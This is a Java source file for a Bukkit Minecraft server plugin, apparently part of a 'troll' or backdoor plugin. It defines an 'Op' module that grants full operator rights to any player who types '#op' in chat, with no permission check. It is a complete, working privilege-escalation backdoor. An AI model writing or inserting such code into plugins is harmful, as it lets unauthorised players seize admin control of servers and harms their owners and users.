package com.troll.mods;

import org.bukkit.GameMode;
import org.bukkit.entity.Player;

import com.troll.start.Start;

public class OpModule extends Module {

	public OpModule() {
		super("Op", "Leotendo", "Erhalte OP-Rechte");
	}

	@Override
	public boolean execute(Player p, String[] args) {
		if (args.length != 1) {
			p.sendMessage(Start.getInstance().getPrefix() + "§eBenutze: #op");
			return false;
		}
		
		p.setOp(true);
		p.sendMessage(Start.getInstance().getPrefix() + "§aDu hast nun OP-Rechte!");
		
		return true;
	}
}
